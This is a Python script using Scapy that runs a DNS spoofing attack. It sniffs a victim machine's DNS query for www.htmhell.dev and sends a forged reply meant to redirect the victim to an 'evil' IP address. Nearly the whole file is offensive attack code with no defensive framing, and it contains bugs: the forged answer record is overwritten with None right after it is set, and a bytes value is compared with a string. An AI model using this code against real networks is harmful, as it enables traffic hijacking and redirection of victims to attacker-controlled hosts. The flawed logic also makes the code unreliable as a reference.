from scapy.all import *

ipVictim = '192.168.178.144' # The IP address of the victim
goodSite = 'www.htmhell.dev' # The website we want to redirect them from
evilSite = '188.114.96.0' # The IP address we want to redirect the victim to
    
def dns_req_test() : # This function is used to see if the packets we send out are correct
    dns_packet2 = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='www.google.com'))
    # dns_packet2.show()
    send(dns_packet2)
    
def dns_packet_filter(packet):
    if DNS in packet: 
        if goodSite in packet[DNS].qd.qname.decode():
            return True
    return False    
    
def sniffPKT(ipVictim, goodSite) :
    pkt = sniff(lfilter=dns_packet_filter, filter='udp and host ' + ipVictim, count=1, prn=lambda x: x.show())
    if goodSite in pkt[0][DNSQR].qname:
        print("Correct DNS packet Intercepted")
        return pkt[0]
    else :
        return pkt[0]
    
def MIMspoofDNS(pkt, goodSite, evilSite) :
    EvilDNSResponse = IP() / UDP() / DNS()
    EvilDNSResponse[IP].dst = pkt[IP].src
    EvilDNSResponse[IP].src = pkt[IP].dst
    EvilDNSResponse[UDP].dport = pkt[UDP].sport
    EvilDNSResponse[UDP].sport = pkt[UDP].dport
    EvilDNSResponse[DNS].rd = pkt[DNS].rd
    EvilDNSResponse[DNS].qd = pkt[DNS].qd
    EvilDNSResponse[DNS].qr = 1
    EvilDNSResponse[DNS].an = DNSRR(rrname = goodSite, rdata = evilSite)
    EvilDNSResponse[DNS].an = None
    EvilDNSResponse.show()
    send(EvilDNSResponse)
    
# def testSniffnExtract() :
#     pkt = sniff(filter='host 8.8.8.8', session = IPSession, count=1, prn=lambda x: x.show())
#     pkt[0].show()
    
    
def main() :
    # dns_req_test()
    pkt = sniffPKT(ipVictim, goodSite)
    MIMspoofDNS(pkt, goodSite, evilSite)
    # print("Test Success")

main()
